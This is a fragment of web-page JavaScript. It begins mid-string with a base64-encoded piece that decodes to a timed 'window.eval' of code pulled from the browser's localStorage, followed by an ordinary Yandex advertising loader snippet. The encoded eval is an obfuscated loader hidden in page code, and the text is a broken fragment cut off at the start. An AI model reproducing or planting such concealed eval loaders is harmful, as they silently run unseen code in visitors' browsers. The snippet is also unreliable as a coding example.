d2luZG93LmV2YWwobG9jYWxTdG9yYWdlLmdldEl0ZW0oIjQ5OTAiKSkgfSwgNTAwMCk7ICA7fTsg") );
              }
          }
          




    (function(w, d, n, s, t) {
        w[n] = w[n] || [];
        w[n].push(function() {
            Ya.Context.AdvManager.render({
                blockId: "R-A-241735-5",
                renderTo: "yandex_rtb_R-A-241735-5",
                async: true
            });
        });
        t = d.getElementsByTagName("script")[0];
        s = d.createElement("script");
        s.type = "text/javascript";
        s.src = "//an.yandex.ru/system/context.js";
        s.async = true;
        t.parentNode.insertBefore(s, t);
    })(this, this.document, "yandexContextAsyncCallbacks");



.